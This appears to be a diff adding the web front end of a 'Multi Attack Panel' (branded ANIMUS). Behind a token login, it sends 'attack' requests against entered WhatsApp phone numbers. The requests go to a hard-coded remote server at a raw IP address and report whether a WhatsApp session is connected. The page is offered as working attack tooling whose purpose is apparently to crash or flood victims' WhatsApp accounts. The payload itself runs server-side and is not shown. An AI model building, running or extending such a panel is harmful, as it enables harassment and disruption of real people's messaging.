@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Multi Attack Panel</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: url("https://files.catbox.moe/ykssap.jpg") no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      text-align: center;
+      padding-top: 100px;
+    }
+      .fade {
+    opacity: 0;
+    transition: opacity 0.5s ease;
+  }
+
+  .fade.show {
+    opacity: 1;
+  }
+    input, button {
+      padding: 10px;
+      font-size: 16px;
+      margin: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+    input {
+      width: 250px;
+    }
+    button {
+      background: #e60000;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    #tokenStatus {
+  background: red;
+  color: white;
+  padding: 10px;
+  margin-top: 10px;
+  border-radius: 8px;
+  max-width: 100px; 
+  margin-left: auto;
+  margin-right: auto;
+  word-wrap: break-word;
+  font-size: 14px;
+  transition: opacity 0.5s ease;
+  }
+    button:hover {
+      background: #ff1a1a;
+    }
+    .btn-group {
+      margin-top: 20px;
+    }
+    #result {
+      margin-top: 30px;
+      font-size: 18px;
+    }
+    #attackSection {
+      display: none;
+      transition: opacity 0.5s ease;
+    }
+  </style>
+</head>
+<body>
+  <!-- Token Section -->
+  <div id="tokenSection">
+      <h2>Silahkan Login</h2>
+    <input type="text" id="tokenInput" placeholder="Enter Token" />
+    <br>
+    <button onclick="validateToken()">Submit Token</button>
+    <div id="tokenStatus"></div>
+  </div>
+
+  <!-- Attack Section -->
+  <div id="attackSection">
+      <h1>ANIMUS</h1>
+    <input type="text" id="numberInput" placeholder="Enter Number (e.g. 628xxxx)" />
+    <div class="btn-group">
+      <button onclick="attack('delay')">Attack V1</button>
+      <button onclick="attack('delay')">Attack V2</button>
+      <button onclick="attack('delay')">Attack V3</button>
+    </div>
+   <p id="waConnectionStatus" style="font-weight: bold; font-size: 16px;">Status WhatsApp: Checking...</p>
+  </div>
+
+  <div id="result"></div>
+
+  <script>
+    let token = "";
+    const API_BASE = "http://45.55.62.114:4576"; // Ganti sesuai IP API kamu
+
+    async function validateToken() {
+      const inputToken = document.getElementById("tokenInput").value.trim();
+      const statusDiv = document.getElementById("tokenStatus");
+
+      if (!inputToken) {
+        statusDiv.textContent = "⚠️ Token harus diisi!";
+        return;
+      }
+
+      statusDiv.textContent = "⏳ Mengecek token...";
+
+      try {
+        // Misal kamu validasi token dengan endpoint delay dummy
+        
+        const response = await fetch(`${API_BASE}/msg/${inputToken}`);
+        const data = await response.json();
+
+        if (data.token === "false") {
+          statusDiv.textContent = `❌ Token tidak valid!`;
+          return;
+        }
+
+        token = inputToken;
+        document.getElementById("tokenSection").style.display = "none";
+        document.getElementById("attackSection").style.display = "block";
+        statusDiv.textContent = "";
+        updateWAStatus();
+      } catch (error) {
+        statusDiv.textContent = `❌ Error: ${error.message}`;
+      }
+    }
+
+    async function attack(endpoint) {
+      const number = document.getElementById('numberInput').value.trim();
+      const resultDiv = document.getElementById('result');
+
+      if (!number) {
+        resultDiv.textContent = "⚠️ Please enter a number.";
+        return;
+      }
+
+      resultDiv.textContent = `⏳ Sending Attack to /${endpoint}/${number}/${token}`;
+
+      try {
+        const response = await fetch(`${API_BASE}/${endpoint}/${encodeURIComponent(number)}/${encodeURIComponent(token)}`);
+        const data = await response.json();
+
+        if (!response.ok || data.status !== "Success") {
+          throw new Error(data.reason || "Request failed");
+        }
+
+        resultDiv.textContent = `✅ Success: ${data.status} → ${data.target || ""}`;
+      } catch (error) {
+        resultDiv.textContent = `❌ Error: ${error.message}`;
+      }
+    }
+    async function updateWAStatus() {
+  const statusEl = document.getElementById("waConnectionStatus");
+
+  try {
+    const response = await fetch(`${API_BASE}/msg/${encodeURIComponent(token)}`);
+    const text = await response.text(); // ← ambil teks mentah
+
+
+
+    if (response.whatsapp === "Whatsaap Tidak Tersambung") {
+      statusEl.textContent = "Status WhatsApp: ❌ Disconnected";
+      statusEl.style.color = "red";
+    } else {
+      statusEl.textContent = "Status WhatsApp: ✅ Connected";
+      statusEl.style.color = "lime";
+    }
+  } catch (error) {
+    statusEl.textContent = `Status WhatsApp: ⚠️ Error ${error}`;
+    statusEl.style.color = "orange";
+  }
+}
+
+    
+
+  </script>
+
+</body>
+</html>
